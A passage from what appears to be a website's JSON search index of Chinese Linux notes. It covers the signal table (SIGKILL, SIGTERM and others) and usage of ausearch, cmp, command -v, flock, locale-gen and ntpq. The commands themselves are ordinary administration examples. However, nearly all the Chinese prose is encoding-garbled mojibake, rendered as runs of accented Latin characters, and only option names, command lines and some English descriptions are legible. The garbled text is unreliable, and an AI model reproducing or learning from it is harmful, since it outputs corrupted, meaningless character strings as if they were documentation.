ç”±abort(3)å‘å‡ºçš„é€€å‡ºæŒ‡ä»¤ 7 SIGBUS/SIGEMT dump æ€»çº¿å¼‚å¸¸/EMTæŒ‡ä»¤ 8 SIGFPE dump æµ®ç‚¹è¿ç®—æº¢å‡º 9 SIGKILL ç»ˆæ­¢ å¼ºåˆ¶æ€æ­»è¿›ç¨‹(å¤§æ‹›. è¿›ç¨‹ä¸å¯æ•è·). è¿™ä¸ªä¿¡å·è¿›ç¨‹æ— æ³•å¿½è§† ç›´æ¥åœ¨ç³»ç»Ÿå±‚é¢æŠŠè¿›ç¨‹æ€æ‰. æ‰€ä»¥åœ¨Pythonä¸­ä»–çš„ä¸èƒ½ç›‘å¬çš„ 10 SIGUSR1 ç»ˆæ­¢ ç”¨æˆ·ä¿¡å·. è¿›ç¨‹å¯è‡ªå®šä¹‰ç”¨é€” 11 SIGSEGV dump éæ³•å†…å­˜åœ°å€. æ— æ•ˆçš„å†…å­˜å¼•ç”¨ 12 SIGUSR2 ç»ˆæ­¢ ç”¨æˆ·ä¿¡å·. è¿›ç¨‹å¯è‡ªå®šä¹‰ç”¨é€” 13 SIGPIPE ç»ˆæ­¢ å‘æŸä¸ªæ²¡æœ‰è¯»å–çš„ç®¡é“ä¸­å†™å…¥æ•°æ®. ç®¡é“ç ´è£‚: å†™ä¸€ä¸ªæ²¡æœ‰è¯»ç«¯å£çš„ç®¡é“ 14 SIGALRM ç»ˆæ­¢ æ—¶é’Ÿä¸­æ–­(é—¹é’Ÿ). ç”±alarm(2)å‘å‡ºçš„ä¿¡å· 15 SIGTERM ç»ˆæ­¢ è¿›ç¨‹ç»ˆæ­¢(è¿›ç¨‹å¯æ•è·) 16 SIGSTKFLT ç»ˆæ­¢ åå¤„ç†å™¨æ ˆé”™è¯¯ 17 SIGCHLD å¿½ç•¥ å­è¿›ç¨‹é€€å‡ºæˆ–ä¸­æ–­ 18 SIGCONT ç»§ç»­ å¦‚è¿›ç¨‹åœæ­¢çŠ¶æ€åˆ™å¼€å§‹è¿è¡Œ 19 SIGSTOP åœæ­¢ åœæ­¢è¿›ç¨‹è¿è¡Œ 20 SIGSTP åœæ­¢ é”®ç›˜äº§ç”Ÿçš„åœæ­¢ 21 SIGTTIN åœæ­¢ åå°è¿›ç¨‹è¯·æ±‚è¾“å…¥ 22 SIGTTOU åœæ­¢ åå°è¿›ç¨‹è¯·æ±‚è¾“å‡º 23 SIGURG å¿½ç•¥ socketå‘é€ç´§æ€¥æƒ…å†µ 24 SIGXCPU dump CPUæ—¶é—´é™åˆ¶è¢«æ‰“ç ´ 25 SIGXFSZ dump æ–‡ä»¶å¤§å°é™åˆ¶è¢«æ‰“ç ´ 26 SIGVTALRM ç»ˆæ­¢ è™šæ‹Ÿå®šæ—¶æ—¶é’Ÿ 27 SIGPROF ç»ˆæ­¢ profile timer clock 28 SIGWINCH å¿½ç•¥ çª—å£å°ºå¯¸è°ƒæ•´ 29 SIGIO/SIGPOLL ç»ˆæ­¢ I/Oå¯ç”¨ 30 SIGPWR ç»ˆæ­¢ ç”µæºå¼‚å¸¸ 31 SIGSYS/SYSUNUSED dump ç³»ç»Ÿè°ƒç”¨å¼‚å¸¸ æ³¨è§£ ç”±äºä¸åŒç³»ç»Ÿä¸­åŒä¸€ä¸ªæ•°å€¼å¯¹åº”çš„ä¿¡å·ç±»å‹ä¸ä¸€æ ·, æ‰€ä»¥æœ€å¥½ä½¿ç”¨ä¿¡å·åç§°. ä¿¡å·çš„æ•°å€¼è¶Šå°, ä¼˜å…ˆçº§è¶Šé«˜. ä¿¡å·é‡è¯´æ˜(å‚è€ƒ) SIGHUP æœ¬ä¿¡å·åœ¨ç”¨æˆ·ç»ˆç«¯è¿æ¥(æ­£å¸¸æˆ–éæ­£å¸¸)ç»“æŸæ—¶å‘å‡º, é€šå¸¸æ˜¯åœ¨ç»ˆç«¯çš„æ§åˆ¶è¿›ç¨‹ç»“æŸæ—¶, é€šçŸ¥åŒä¸€sessionå†…çš„å„ä¸ªä½œä¸š, è¿™æ—¶å®ƒä»¬ä¸æ§åˆ¶ç»ˆç«¯ä¸å†å…³è”. SIGINT ç¨‹åºç»ˆæ­¢(interrupt)ä¿¡å·, åœ¨ç”¨æˆ·é”®å…¥INTRå­—ç¬¦(é€šå¸¸æ˜¯Ctrl-C)æ—¶å‘å‡º SIGQUIT å’ŒSIGINTç±»ä¼¼, ä½†ç”±QUITå­—ç¬¦(é€šå¸¸æ˜¯Ctrl-)æ¥æ§åˆ¶. è¿›ç¨‹åœ¨å› æ”¶åˆ°SIGQUITé€€å‡ºæ—¶ä¼šäº§ç”Ÿcoreæ–‡ä»¶, åœ¨è¿™ä¸ªæ„ä¹‰ä¸Šç±»ä¼¼äºä¸€ä¸ªç¨‹åºé”™è¯¯ä¿¡å·. SIGILL æ‰§è¡Œäº†éæ³•æŒ‡ä»¤. é€šå¸¸æ˜¯å› ä¸ºå¯æ‰§è¡Œæ–‡ä»¶æœ¬èº«å‡ºç°é”™è¯¯, æˆ–è€…è¯•å›¾æ‰§è¡Œæ•°æ®æ®µ. å †æ ˆæº¢å‡ºæ—¶ä¹Ÿæœ‰å¯èƒ½äº§ç”Ÿè¿™ä¸ªä¿¡å·. SIGTRAP ç”±æ–­ç‚¹æŒ‡ä»¤æˆ–å…¶å®ƒtrapæŒ‡ä»¤äº§ç”Ÿ. ç”±debuggerä½¿ç”¨. SIGABRT ç¨‹åºè‡ªå·±å‘ç°é”™è¯¯å¹¶è°ƒç”¨abortæ—¶äº§ç”Ÿ. SIGIOT åœ¨PDP-11ä¸Šç”±iotæŒ‡ä»¤äº§ç”Ÿ, åœ¨å…¶å®ƒæœºå™¨ä¸Šå’ŒSIGABRTä¸€æ ·. SIGBUS éæ³•åœ°å€, åŒ…æ‹¬å†…å­˜åœ°å€å¯¹é½(alignment)å‡ºé”™. eg: è®¿é—®ä¸€ä¸ªå››ä¸ªå­—é•¿çš„æ•´æ•°, ä½†å…¶åœ°å€ä¸æ˜¯4çš„å€æ•°. SIGFPE åœ¨å‘ç”Ÿè‡´å‘½çš„ç®—æœ¯è¿ç®—é”™è¯¯æ—¶å‘å‡º. ä¸ä»…åŒ…æ‹¬æµ®ç‚¹è¿ç®—é”™è¯¯, è¿˜åŒ…æ‹¬æº¢å‡ºåŠé™¤æ•°ä¸º0ç­‰å…¶å®ƒæ‰€æœ‰çš„ç®—æœ¯çš„é”™è¯¯. SIGKILL ç”¨æ¥ç«‹å³ç»“æŸç¨‹åºçš„è¿è¡Œ. æœ¬ä¿¡å·ä¸èƒ½è¢«é˜»å¡, å¤„ç†å’Œå¿½ç•¥. SIGUSR1 ç•™ç»™ç”¨æˆ·ä½¿ç”¨ SIGSEGV è¯•å›¾è®¿é—®æœªåˆ†é…ç»™è‡ªå·±çš„å†…å­˜, æˆ–è¯•å›¾å¾€æ²¡æœ‰å†™æƒé™çš„å†…å­˜åœ°å€å†™æ•°æ®. SIGUSR2 ç•™ç»™ç”¨æˆ·ä½¿ç”¨ SIGPIPE Broken pipe SIGALRM æ—¶é’Ÿå®šæ—¶ä¿¡å·, è®¡ç®—çš„æ˜¯å®é™…çš„æ—¶é—´æˆ–æ—¶é’Ÿæ—¶é—´. alarmå‡½æ•°ä½¿ç”¨è¯¥ä¿¡å·. SIGTERM ç¨‹åºç»“æŸ(terminate)ä¿¡å·, ä¸SIGKILLä¸åŒçš„æ˜¯è¯¥ä¿¡å·å¯ä»¥è¢«é˜»å¡å’Œå¤„ç†. é€šå¸¸ç”¨æ¥è¦æ±‚ç¨‹åºè‡ªå·±æ­£å¸¸é€€å‡º. shellå‘½ä»¤killç¼ºçœäº§ç”Ÿè¿™ä¸ªä¿¡å·. SIGCHLD å­è¿›ç¨‹ç»“æŸæ—¶, çˆ¶è¿›ç¨‹ä¼šæ”¶åˆ°è¿™ä¸ªä¿¡å·. SIGCONT è®©ä¸€ä¸ªåœæ­¢(stopped)çš„è¿›ç¨‹ç»§ç»­æ‰§è¡Œ. æœ¬ä¿¡å·ä¸èƒ½è¢«é˜»å¡. å¯ä»¥ç”¨ä¸€ä¸ªhandleræ¥è®©ç¨‹åºåœ¨ç”±stoppedçŠ¶æ€å˜ä¸ºç»§ç»­æ‰§è¡Œæ—¶å®Œæˆç‰¹å®šçš„å·¥ä½œ. ä¾‹å¦‚, é‡æ–°æ˜¾ç¤ºæç¤ºç¬¦. å‚è€ƒ:: https://www.jianshu.com/p/1a9ea7f4d46e","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Conceptual-Linux-system-signal.html","loc":"/yq-doc-source-docs-operating-system-linux-Conceptual-Linux-system-signal.html"},{"title":"ausearch","text":"ä½¿ç”¨ausearchå‘½ä»¤å¯ä»¥æœç´¢å®¡è®¡è®°å½•ï¼Œå¿…é¡»ä»¥rootç”¨æˆ·èº«ä»½æ‰§è¡Œausearchå‘½ä»¤ã€‚ å®‰è£…: yum install audit # è¦ä¹ˆ up2date install audit #debian apt install auditd è¯­æ³•æ ¼å¼: ausearch [å‚æ•°] é€‰é¡¹å«ä¹‰ -f <æ–‡ä»¶å> åŸºäºæ–‡ä»¶åçš„æœç´¢ -c <å‘½ä»¤è¡Œåç§°> åŸºäºå‘½ä»¤è¡Œåç§°çš„æœç´¢ -n <è®¡ç®—æœºåç§°> åŸºäºè®¡ç®—æœºåç§°çš„æœç´¢ -p <è¿›ç¨‹ID> åŸºäºè¿›ç¨‹IDçš„æœç´¢ -k <é”®å­—æ®µ> åŸºäºé”®å­—æ®µçš„æœç´¢ -m <æ¶ˆæ¯ç±»å‹> åŸºäºæ¶ˆæ¯ç±»å‹çš„æœç´¢ -x <å¯æ‰§è¡Œæ–‡ä»¶å> åŸºäºå¯æ‰§è¡Œæ–‡ä»¶åçš„æœç´¢ -a <å®¡è®¡äº‹ä»¶ID> åŸºäºå®¡è®¡äº‹ä»¶IDçš„æœç´¢ -o <SELinuxå¯¹è±¡ä¸Šä¸‹æ–‡> åŸºäºå¯¹è±¡ä¸Šä¸‹æ–‡çš„æœç´¢ -e <é€€å‡ºä»£ç > åŸºäºç³»ç»Ÿè°ƒç”¨é€€å‡ºä»£ç çš„æœç´¢ -r å®Œå…¨æœªæ ¼å¼åŒ–è¾“å‡º -ga<æ‰€æœ‰ç»„ç¾¤çš„ID> åŸºäºæ‰€æœ‰ç»„ç¾¤GIDçš„æœç´¢ -ha<ä¸»æœºå> åŸºäºè¿œç¨‹ä¸»æœºåçš„æœç´¢ -ui<ç”¨æˆ·UID> åŸºäºç”¨æˆ·UIDçš„æœç´¢ -tm<ç»ˆç«¯> åŸºäºç»ˆç«¯çš„æœç´¢ -sv<æˆåŠŸå€¼> åŸºäºç³»ç»Ÿè°ƒç”¨æˆ–äº‹ä»¶æˆåŠŸå€¼çš„æœç´¢ -pp<çˆ¶è¿›ç¨‹ID> åŸºäºçˆ¶è¿›ç¨‹IDçš„æœç´¢ -ul<ç”¨æˆ·ç™»å½•ID> åŸºäºç”¨æˆ·ç™»å½•IDçš„æœç´¢ -ue<æœ‰æ•ˆUID> åŸºäºæœ‰æ•ˆUIDçš„æœç´¢ -ge<æœ‰æ•ˆGID> åŸºäºæœ‰æ•ˆGIDçš„æœç´¢ -session<ç™»å½•ä¼šè¯ID> åŸºäºç™»å½•ä¼šè¯IDçš„æœç´¢ -sc<ç³»ç»Ÿè°ƒç”¨çš„åç§°> åŸºäºç³»ç»Ÿè°ƒç”¨çš„åç§°æˆ–å¯¹è±¡ç¼–å·çš„æœç´¢ -se<SELinuxä¸Šä¸‹æ–‡> åŸºäºä»»ä½•ä¸»ä½“æˆ–å¯¹è±¡çš„ä¸Šä¸‹æ–‡æœç´¢ -ts<å¼€å§‹æ—¥æœŸ><å¼€å§‹æ—¥æœŸ>, --start<å¼€å§‹æ—¥æœŸ><å¼€å§‹æ—¥æœŸ> åŸºäºå¼€å§‹æ—¶é—´ã€å¼€å§‹æ—¶é—´çš„æœç´¢ -ua<æ‰€æœ‰ç”¨æˆ·çš„UID> åŸºäºæ‰€æœ‰çš„ç”¨æˆ·UIDçš„æœç´¢ -te<ç»“æŸæ—¶é—´><ç»“æŸæ—¶é—´> åŸºäºç»“æŸæ—¶é—´ã€ç»“æŸæ—¶é—´çš„æœç´¢ -su<SELinuxä¸Šä¸‹æ–‡> åŸºäºä¸»é¢˜çš„ä¸Šä¸‹æ–‡çš„æœç´¢ ä¾‹ åŸºäºç”¨æˆ·rootæœç´¢å®¡è®¡è®°å½•: [root@localhost ~]# ausearch -ui 0 åŸºäºç»ˆç«¯tty1æœç´¢å®¡è®¡è®°å½•: [root@localhost ~]# ausearch -tm tty1 åŸºäºè¿›ç¨‹å·1779æœç´¢å®¡è®¡è®°å½•: [root@localhost ~]# ausearch -p 1779","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-AUSEARCH.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-AUSEARCH.html"},{"title":"cmp","text":"Linux cmpå‘½ä»¤ç”¨äºæ¯”è¾ƒä¸¤ä¸ªæ–‡ä»¶æ˜¯å¦æœ‰å·®å¼‚ã€‚ å½“ç›¸äº’æ¯”è¾ƒçš„ä¸¤ä¸ªæ–‡ä»¶å®Œå…¨ä¸€æ ·æ—¶ï¼Œåˆ™è¯¥æŒ‡ä»¤ä¸ä¼šæ˜¾ç¤ºä»»ä½•ä¿¡æ¯ã€‚ è‹¥å‘ç°æœ‰æ‰€å·®å¼‚ï¼Œé¢„è®¾ä¼šæ ‡ç¤ºå‡ºç¬¬ä¸€ä¸ªä¸åŒä¹‹å¤„çš„å­—ç¬¦å’Œåˆ—æ•°ç¼–å·ã€‚ è‹¥ä¸æŒ‡å®šä»»ä½•æ–‡ä»¶åç§°æˆ–æ˜¯æ‰€ç»™äºˆçš„æ–‡ä»¶åä¸º\"-\"ï¼Œåˆ™cmpæŒ‡ä»¤ä¼šä»æ ‡å‡†è¾“å…¥è®¾å¤‡è¯»å–æ•°æ®ã€‚ è¯­æ³• : cmp [-clsv][-i <å­—ç¬¦æ•°ç›®>][--help][ç¬¬ä¸€ä¸ªæ–‡ä»¶][ç¬¬äºŒä¸ªæ–‡ä»¶] å‚æ•° ï¼š -c , --print-chars é™¤äº†æ ‡æ˜å·®å¼‚å¤„çš„åè¿›åˆ¶å­—ç ä¹‹å¤–ï¼Œä¸€å¹¶æ˜¾ç¤ºè¯¥å­—ç¬¦æ‰€å¯¹åº”å­—ç¬¦ã€‚ -i <å­—ç¬¦æ•°ç›®> , --ignore-initial= <å­—ç¬¦æ•°ç›®> æŒ‡å®šä¸€ä¸ªæ•°ç›®ã€‚ -l , --verbose æ ‡ç¤ºå‡ºæ‰€æœ‰ä¸ä¸€æ ·çš„åœ°æ–¹ã€‚ -s , --quiet , --silent ä¸æ˜¾ç¤ºé”™è¯¯ä¿¡æ¯ã€‚ -v , --version æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯ã€‚ --help åœ¨çº¿å¸®åŠ©ã€‚ å®ä¾‹ è¦ç¡®å®šä¸¤ä¸ªæ–‡ä»¶æ˜¯å¦ç›¸åŒï¼Œè¯·è¾“å…¥: cmp prog.o.bak prog.o è¿™æ¯”è¾ƒ prog.o.bak å’Œ prog.oã€‚å¦‚æœæ–‡ä»¶ç›¸åŒï¼Œåˆ™ä¸æ˜¾ç¤ºæ¶ˆæ¯ã€‚ å¦‚æœæ–‡ä»¶ä¸åŒï¼Œåˆ™æ˜¾ç¤ºç¬¬ä¸€ä¸ªä¸åŒçš„ä½ç½®ï¼›ä¾‹å¦‚: prog.o.bak prog.o differ: char 4, line 1 å¦‚æœæ˜¾ç¤ºæ¶ˆæ¯ cmp: EOF on prog.o.bak åˆ™ prog.o çš„ç¬¬ä¸€éƒ¨åˆ†ä¸ prog.o.bak ç›¸åŒï¼Œä½†åœ¨ prog.o ä¸­è¿˜æœ‰å…¶ä»–æ•°æ®ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-CMP.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-CMP.html"},{"title":"command","text":"command -v å¯ä»¥åˆ¤æ–­ä¸€ä¸ªå‘½ä»¤æ˜¯å¦æ”¯æŒï¼Œå¦‚æœä¸€ä¸ªè„šæœ¬éœ€è¦ï¼Œæˆ–è€…è¿˜è¦åŠ ifåˆ¤æ–­: if command -v python ;then echo yes fi","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Command.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Command.html"},{"title":"diff","text":"æ–‡ä»¶å¯¹æ¯”","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-DIFF.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-DIFF.html"},{"title":"flock","text":"flockæ˜¯Linuxä¸‹çš„æ–‡ä»¶é”ã€‚ å½“å¤šä¸ªè¿›ç¨‹å¯èƒ½ä¼šå¯¹åŒæ ·çš„æ•°æ®æ‰§è¡Œæ“ä½œæ—¶, è¿™äº›è¿›ç¨‹éœ€è¦ä¿è¯å…¶å®ƒè¿›ç¨‹æ²¡æœ‰ä¹Ÿåœ¨æ“ä½œ, ä»¥å…æŸåæ•°æ®ã€‚ -s , --shared è·å–ä¸€ä¸ªå…±äº«é”, åœ¨å®šå‘ä¸ºæŸæ–‡ä»¶çš„FDä¸Šè®¾ç½®å…±äº«é”è€Œæœªé‡Šæ”¾é”çš„æ—¶é—´å†…, å…¶ä»–è¿›ç¨‹è¯•å›¾åœ¨å®šå‘ä¸ºæ­¤æ–‡ä»¶çš„FDä¸Šè®¾ç½®ç‹¬å é”çš„è¯·æ±‚å¤±è´¥, è€Œå…¶ä»–è¿›ç¨‹è¯•å›¾åœ¨å®šå‘ä¸ºæ­¤æ–‡ä»¶çš„FDä¸Šè®¾ç½®å…±äº«é”çš„è¯·æ±‚ä¼šæˆåŠŸã€‚ -x , -e , --exclusive è·å–ä¸€ä¸ªæ’å®ƒé”, æˆ–è€…ç§°ä¸ºå†™å…¥é”, ä¸ºé»˜è®¤é¡¹ã€‚ -u , --unlock æ‰‹åŠ¨é‡Šæ”¾é”, ä¸€èˆ¬æƒ…å†µä¸å¿…é¡», å½“FDå…³é—­æ—¶, ç³»ç»Ÿä¼šè‡ªåŠ¨è§£é”, æ­¤å‚æ•°ç”¨äºè„šæœ¬å‘½ä»¤ä¸€éƒ¨åˆ†éœ€è¦å¼‚æ­¥æ‰§è¡Œ, ä¸€éƒ¨åˆ†å¯ä»¥åŒæ­¥æ‰§è¡Œçš„æƒ…å†µã€‚ -n , --nb , --nonblock éé˜»å¡æ¨¡å¼, å½“è·å–é”å¤±è´¥æ—¶, è¿”å›1è€Œä¸æ˜¯ç­‰å¾…ã€‚ -w , --wait , --timeout seconds è®¾ç½®é˜»å¡è¶…æ—¶, å½“è¶…è¿‡è®¾ç½®çš„ç§’æ•°æ—¶, é€€å‡ºé˜»å¡æ¨¡å¼, è¿”å›1, å¹¶ç»§ç»­æ‰§è¡Œåé¢çš„è¯­å¥ã€‚ -o , --close è¡¨ç¤ºå½“æ‰§è¡Œcommandå‰å…³é—­è®¾ç½®é”çš„FD, ä»¥ä½¿commandçš„å­è¿›ç¨‹ä¸ä¿æŒé”ã€‚ -c , --command command åœ¨shellä¸­æ‰§è¡Œå…¶åçš„è¯­å¥ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-FLOCK.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-FLOCK.html"},{"title":"locale-gen","text":"é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸ºåŸºäº libc çš„ç¨‹åºçš„æœ¬åœ°åŒ–æä¾›åŸºæœ¬æ”¯æŒçš„ locale åŒ…ä¸åŒ…å«æ¯ç§æ”¯æŒè¯­è¨€çš„å¯ç”¨æœ¬åœ°åŒ–æ–‡ä»¶ã€‚ ç”±äºæ­¤ç±»æ–‡ä»¶çš„å·¨å¤§å¤§å°ä»¥åŠ libc æ”¯æŒçš„å¤§é‡è¯­è¨€ï¼Œæ­¤é™åˆ¶å˜å¾—å¿…è¦ã€‚ å› æ­¤ï¼ŒDebian ä½¿ç”¨äº†ä¸€ç§ç‰¹æ®Šçš„æœºåˆ¶ï¼Œæˆ‘ä»¬åœ¨ç›®æ ‡ä¸»æœºä¸Šå‡†å¤‡å®é™…çš„æœ¬åœ°åŒ–æ–‡ä»¶å¹¶ä»…åˆ†å‘å®ƒä»¬çš„æ¨¡æ¿ã€‚ locale-gen æ˜¯ä¸€ä¸ªç¨‹åºï¼Œå®ƒè¯»å–æ–‡ä»¶ /etc/locale.gen å¹¶ä¸ºæ‰€é€‰çš„æœ¬åœ°åŒ–é…ç½®æ–‡ä»¶è°ƒç”¨ localedef ã€‚ ä¿®æ”¹ /etc/locale.gen æ–‡ä»¶åè¿è¡Œ locale-gen ã€‚ /etc/locale.gen ä¸»é…ç½®æ–‡ä»¶ï¼Œå…·æœ‰ç®€å•çš„æ ¼å¼ï¼šæ¯è¡Œä¸ä¸ºç©ºä¸”ä¸ä»¥ # å¼€å¤´çš„è¡Œéƒ½è¢«è§†ä¸ºè¦æ„å»ºçš„è¯­è¨€ç¯å¢ƒå®šä¹‰ã€‚ /var/lib/locales/supported.d/ åŒ…å«è¯­è¨€åŒ…æä¾›çš„ locale.gen ç‰‡æ®µçš„ç›®å½•ã€‚ä¸è¦æ‰‹åŠ¨ç¼–è¾‘è¿™äº›ï¼Œå®ƒä»¬å°†åœ¨åŒ…å‡çº§æ—¶è¢«è¦†ç›–ã€‚ åå­—: locale-gen - ç¼–è¯‘æœ¬åœ°å®šä¹‰æ–‡ä»¶çš„ä¸€ä¸ªåˆ—è¡¨ ç®€ä»‹: locale-gen [options] [locale] [language] æè¿°: ç¼–è¯‘æœ¬åœ°æ–‡ä»¶éœ€è¦50Mçš„ç£ç›˜å®¹é‡ï¼Œå¹¶å´å¤§éƒ¨åˆ†ç”¨æˆ·ä»…éœ€è¦å¾ˆå°‘çš„locales. ä¸ºäº†èŠ‚çœç£ç›˜å®¹é‡ï¼Œç¼–è¯‘çš„locale æ–‡ä»¶ä¸åœ¨LocalesåŒ…ä¸­å‘å¸ƒï¼Œ ä½†æ˜¯å½“è¿™äº›åŒ…é€šè¿‡è¿è¡Œlocale-genç¨‹åºå®‰è£…çš„æ—¶å€™ï¼Œå¯é€‰çš„localesæ˜¯è‡ªåŠ¨äº§ç”Ÿçš„ã€‚ å¦‚æœlanguageså’Œlocalesçš„ä¸€ä¸ªåˆ—è¡¨è¢«å…·ä½“åˆ°ä¸€ä¸ªå‚æ•°ï¼Œ é‚£ä¹ˆlocale-gen ä»…ä»…äº§ç”Ÿè¿™äº›å…·ä½“çš„localesï¼Œ å¹¶æ·»åŠ æ–°çš„ä¸€äº›åˆ°/var/lib/locales/supported.d/localæ–‡ä»¶ä¸­ã€‚ å¦åˆ™äº§ç”Ÿæ‰€æœ‰çš„æ”¯æŒçš„locales. locale æ•°æ®æ–‡ä»¶å¯ä»¥å­˜å‚¨åœ¨ä¸€ä¸ªå•ä¸€çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆ/usr/lib/locale/locale-archiveï¼‰ ï¼Œ æˆ–è€…åœ¨ä¸€ä¸ªæ›´æ·±çš„æ ‘å½¢ç»“æ„ä¸‹çš„ä¸ªäººæ–‡ä»¶/usr/lib/locale/<locale_name>/LC_*. ä½†æ˜¯ä¸åƒlocalesåŒ…ï¼Œå½“è¿è¡Œlocale-genæ—¶ï¼Œç¼–è¯‘çš„locale definitionsä¸è¢«ç§»é™¤ï¼Œ å¦‚æœlocaleæºä»£ç æ–‡ä»¶ä¿®æ”¹äº†ï¼Œlocales æ‰å¯ä»¥åœ¨ä¸€æ¬¡ç¼–è¯‘ã€‚ é€‰é¡¹, è¿™äº›é€‰é¡¹è¦†ç›–äº†/etc/belocs/locale-gen.confä¸‹çš„è®¾ç½® --help ä¸€äº›å¸®åŠ©ä¿¡æ¯å’Œé€€å‡º --purge åœ¨è¿è¡Œä¹‹å‰ï¼Œç§»é™¤æ‰€æœ‰å­˜åœ¨çš„locales --no-purge ä¸ä¸Šç›¸å --archive å½“è¿™ä¸ªé€‰é¡¹è¢«è®¾ç½®ï¼ŒLocaleæ•°æ®æ˜¯è¢«å­˜å‚¨åœ¨å•ä¸€çš„æ–‡æ¡£/usr/lib/locale/locale-archive --no-archive . --aliases= <FILE locale> åˆ«åä»FILEæ–‡ä»¶ä¸­è¯»å‡º æ–‡ä»¶ï¼š /var/lib/locales/supported.d/* åˆ—å‡ºäº†æ‰€æœ‰è¦äº§ç”Ÿçš„Localesã€‚æ–‡ä»¶æ ¼å¼å’Œ/usr/share/i18n/SUPPORTED ç›¸ä¼¼ã€‚ /etc/belocs/locale-gen.conf è‡ªå®šä¹‰ç¼–è¯‘çš„localeæ–‡ä»¶æ€ä¹ˆå­˜å‚¨åˆ°ç£ç›˜ä¸Šã€‚ /usr/lib/locale/<locale-name>/LC_* ç¼–è¯‘Localeæ•°æ® /usr/lib/locale/locale-archive äº§ç”ŸåŒ…å«ç¼–è¯‘çš„localeæ•°æ®çš„å½’æ¡£ï¼Œå¦‚æœ--archive è¢«è®¾ç½® /var/lib/belocs ç”¨äºè¿½è¸ªåœ¨Localeæºç æ–‡ä»¶å˜åŒ–çš„ç›®å½• ç¯å¢ƒå˜é‡ï¼š è¿™äº›ç¯å¢ƒå˜é‡å½±å“åˆ°æ¯ä¸€ä¸ªå¯¹æ‰€æœ‰çš„locale-awareç¨‹åºçš„Localeç±»åˆ« LC_CTYPE Character classification and case conversion. LC_COLLATE Collation order. LC_TIME Date and time formats. LC_NUMERIC Non-monetary numeric formats. LC_MONETARY Monetary formats. LC_MESSAGES Formats of informative and diagnostic messages and interactive responses. LC_PAPER Paper size. LC_NAME Name formats. LC_ADDRESS Address formats and location information. LC_TELEPHONE Telephone number formats. LC_MEASUREMENT Measurement units (Metric or Other). LC_IDENTIFICATION Metadata about the locale information. This environment variable can switch against multiple locale database: LOCPATH The directory where locale data is stored. By default, /usr/lib/locale is used.","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Locale-Gen.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Locale-Gen.html"},{"title":"ntpq","text":"ntpqæŒ‡ä»¤ä½¿ç”¨NTPæ¨¡å¼6æ•°æ®åŒ…ä¸NTPæœåŠ¡å™¨é€šä¿¡,èƒ½å¤Ÿåœ¨å…è®¸çš„ç½‘ç»œä¸ŠæŸ¥è¯¢çš„å…¼å®¹çš„æœåŠ¡å™¨ã€‚å®ƒä»¥äº¤äº’æ¨¡å¼è¿è¡Œ,æˆ–è€…é€šè¿‡å‘½ä»¤è¡Œå‚æ•°è¿è¡Œã€‚ æ­¤å‘½ä»¤çš„é€‚ç”¨èŒƒå›´ï¼šRedHatã€RHELã€Ubuntuã€CentOSã€Fedoraã€‚ è¯­æ³•æ ¼å¼: ntpq [å‚æ•°] å¸¸ç”¨å‚æ•° -4 ä½¿ç”¨ipv4è§£æ -6 ä½¿ç”¨ipv6è§£æ -d æ‰“å¼€è°ƒè¯•æ¨¡å¼ -i ä½¿ç”¨äº¤äº’æ¨¡å¼ -n ä»¥åè¿›åˆ¶æ ¼å¼æ˜¾ç¤ºä¸»æœºåœ°å€ -p æ˜¾ç¤ºæœåŠ¡å™¨åŒçº§è®¾å¤‡çš„åˆ—è¡¨ -c [command] æ·»åŠ æ‰§è¡Œçš„å‘½ä»¤åˆ°æŒ‡å®šä¸»æœºçš„å‘½ä»¤åˆ—è¡¨ æ³¨è§£ è®¾ç½®ntpçš„æ—¶å€™ï¼Œserverè¡¨ç¤ºå¯¹æ—¶æœåŠ¡å™¨ï¼Œrestrictè¡¨ç¤ºå¯¹æœåŠ¡å™¨åšé™åˆ¶ restricté€‰é¡¹ restricté€‰é¡¹æ ¼å¼: restrict [ å®¢æˆ·ç«¯IP ] mask [ IPæ©ç  ] [å‚æ•°] \"å®¢æˆ·ç«¯IP\" å’Œ \"IPæ©ç \" æŒ‡å®šäº†å¯¹ç½‘ç»œä¸­å“ªäº›èŒƒå›´çš„è®¡ç®—æœºè¿›è¡Œæ§åˆ¶ï¼Œ å¦‚æœä½¿ç”¨defaultå…³é”®å­—ï¼Œåˆ™è¡¨ç¤ºå¯¹æ‰€æœ‰çš„è®¡ç®—æœºè¿›è¡Œæ§åˆ¶ï¼Œå‚æ•°æŒ‡å®šäº†å…·ä½“çš„é™åˆ¶å†…å®¹ï¼Œå¸¸è§çš„å‚æ•°å¦‚ä¸‹ï¼š â—† ignore æ‹’ç»è¿æ¥åˆ°NTPæœåŠ¡å™¨ â—† nomodiy å¿½ç•¥æ‰€æœ‰æ”¹å˜NTPæœåŠ¡å™¨é…ç½®çš„æŠ¥æ–‡ï¼Œä½†å¯ä»¥æŸ¥è¯¢é…ç½®ä¿¡æ¯ â—† noquery å¿½ç•¥æ‰€æœ‰modeå­—æ®µä¸º6æˆ–7çš„æŠ¥æ–‡ï¼Œå®¢æˆ·ç«¯ä¸èƒ½æ”¹å˜NTPæœåŠ¡å™¨é…ç½®ï¼Œä¹Ÿä¸èƒ½æŸ¥è¯¢é…ç½®ä¿¡æ¯ â—† notrap 